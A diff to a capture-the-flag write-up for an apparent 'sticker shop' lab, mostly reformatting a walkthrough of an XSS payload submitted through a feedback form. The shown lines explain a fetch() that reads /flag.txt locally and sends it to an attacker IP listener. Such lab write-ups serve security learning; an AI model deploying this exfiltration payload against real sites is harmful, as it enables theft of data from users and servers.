@@ -30,11 +30,11 @@ The script will read the local /flag.txt file and send it to the attacker host a
     </script>
 
 What is the code trying to do?
-- Fetch the flag: fetch('http://127.0.0.1:8080/flag.txt') makes an HTTP request to http://127.0.0.1:8080/flag.txt to retrieve the contents of “flag.txt.”
+- Fetch the flag: fetch(`http://127.0.0.1:8080/flag.txt`) makes an HTTP request to `http://127.0.0.1:8080/flag.txt` to retrieve the contents of “flag.txt.”
 
 - Read the response as text: Once the request succeeds, .then(response => response.text()) extracts the body of the response as plain text (stored in the variable data).
 
-- Send the flag to my machine: finally, the snippet attempts to send that text (data) to http://10.10.15.220:7000/ by adding it as a query parameter in the URL: fetch("http://10.10.15.220:7000/?flag=" + encodeURIComponent(data));
+- Send the flag to my machine: finally, the snippet attempts to send that text (data) to `http://10.10.15.220:7000/` by adding it as a query parameter in the URL: fetch(`http://10.10.15.220:7000/?flag=` + encodeURIComponent(data));
 - Using encodeURIComponent(...) ensures special characters (like spaces or symbols) in data are properly encoded so they don’t break the URL.
 
 ### Set up the listener (a simple HTTP server) on my machine
@@ -52,4 +52,3 @@ Copy and paste the payload into the feedback textarea => Click Submit.
 
 After submitting the script, the listener will recieve the flag!
 
-![sticker shop screenshot](./screenshots/sticker-shop05.png)
